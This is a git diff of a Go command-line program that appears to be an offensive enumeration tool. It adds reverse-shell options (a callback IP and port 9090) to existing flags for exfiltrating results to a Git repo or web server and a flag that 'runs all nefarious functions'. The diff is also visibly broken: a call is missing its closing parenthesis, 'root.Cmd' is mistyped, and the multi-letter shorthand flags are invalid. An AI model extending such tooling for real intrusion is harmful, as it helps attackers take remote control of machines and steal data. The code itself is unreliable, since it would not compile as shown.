@@ -32,14 +32,17 @@ var rootCmd = &cobra.Command{
 Flags:
 -eg, --exfilGit: Exfil results of the enumeration to a Git Repo.
 -egP, --gitPort: Specify a port to push to if not HTTP/S based.
---eh, --exfilHTTP: Exfil to a Web Server.
---ehP, --httpPort: Specify port for the receiving Web Server.
+-eh, --exfilHTTP: Exfil to a Web Server.
+-ehP, --httpPort: Specify port for the receiving Web Server.
 --CZD, --ChariZarD: Runs all nefarious functions on the machine. This is a designed to be extremely noisy.
 -OA, --outputall: Outputs results to CSV, HTML, JSON files.
 -OH, --outputHTML: Outputs results to HTML.
 -OJ, --outputJSON: Outputs results to JSON.
 -OC, --outputCSV: Outputs results to CSV.
 -fn, --filename: Base name for the results file/s.
+--source, --sourceIP: Reverse Shell connect back IP
+--sP, --sourcePort: Port to connect back too. Defaults 9090
+--rev, --reverse: Calls the shell function to initiate a generic Reverse Shell. Source IP flag required!
 `,
 
 	Run: func(cmd *cobra.Command, args []string) {
@@ -55,6 +58,11 @@ Flags:
 		case "linux":
 			fmt.Println("Running Linux Enumer")
 			entries = oscheck.LinCheck()
+
+		//case "darwin":
+			//fmt.Println("Running MacOS Enumer")
+			//entries = oscheck.MacCheck()
+		
 		default:
 			fmt.Printf("Unsupported OS: %s\n", runtime.GOOS)
 			os.Exit(1)
@@ -66,6 +74,7 @@ Flags:
 
 func init() {
 	rootCmd.Flags().BoolP("help", "h", false, "Displays help info")
+	rootCmd.Flags().BoolP("rev", "rev", false, "Use the Reverse Shell Function")
 	rootCmd.Flags().StringP("exfilGit", "eg", "", "Exfil results to Git Repo")
 	rootCmd.Flags().StringP("exfilHTTP", "eh", "", "Exfil results to Web Server")
 	rootCmd.Flags().StringP("outputall", "OA", "", "Export to CSV, HTML, JSON")
@@ -73,8 +82,10 @@ func init() {
 	rootCmd.Flags().StringP("outputJSON", "OJ", "", "Export to JSON Only")
 	rootCmd.Flags().StringP("outputCSV", "OC", "", "Export to CSV Only")
 	rootCmd.Flags().StringP("filename", "fn", "enumerresults"+time.Now().Format("20060102150405"), "Base name for the Output files")
+	rootCmd.Flags().StringP("sourceIP", "source", "", "Reverse Shell call back IP.\nEnsure Listener Started on callback host to receive the connection" 
 	rootCmd.Flags().IntP("gitPort", "egP", 443, "Non Standard port for Git operations. EX:5000")
 	rootCmd.Flags().IntP("httpPort", "ehP", 80, "Specify Web Server receiving the results. EX: 443 or 8080")
+	root.Cmd.Flags().IntP("sourcePort", "sP", 9090, "Specify the port the reverse shell should connect")
 }
 func main() {
 	fmt.Println("Call checker based on OS type")
